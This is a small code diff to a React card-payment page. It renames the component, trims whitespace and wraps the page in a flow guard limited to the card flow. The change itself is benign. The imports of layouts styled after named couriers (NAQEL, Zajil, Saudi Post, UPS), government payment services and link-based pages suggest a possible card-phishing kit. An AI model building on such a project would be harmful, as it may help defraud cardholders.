@@ -10,15 +10,16 @@ import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
 import { isGovernmentService } from "@/lib/governmentPaymentServices";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
-import { 
-  SecureCardHeader, 
-  CardBrandIndicator, 
+import {
+  SecureCardHeader,
+  CardBrandIndicator,
   StyledCardInput,
   PaymentSecurityFooter,
-  AcceptedCardsDisplay 
+  AcceptedCardsDisplay
 } from "@/components/CardFormComponents";
 import { Shield, Lock, Calendar } from "lucide-react";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
+import PaymentFlowGuard from "@/components/PaymentFlowGuard";
 import { useLink } from "@/hooks/useSupabase";
 import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2 } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -28,7 +29,7 @@ import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency, getCountryByCurrency } from "@/lib/countryCurrencies";
 
-const PaymentCardInput = () => {
+const PaymentCardInputContent = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
@@ -543,5 +544,12 @@ const PaymentCardInput = () => {
     </DynamicPaymentLayout>
   );
 };
+
+// Wrapper component with flow guard for CARD flow only
+const PaymentCardInput = () => (
+  <PaymentFlowGuard allowedFlow="card">
+    <PaymentCardInputContent />
+  </PaymentFlowGuard>
+);
 
 export default PaymentCardInput;
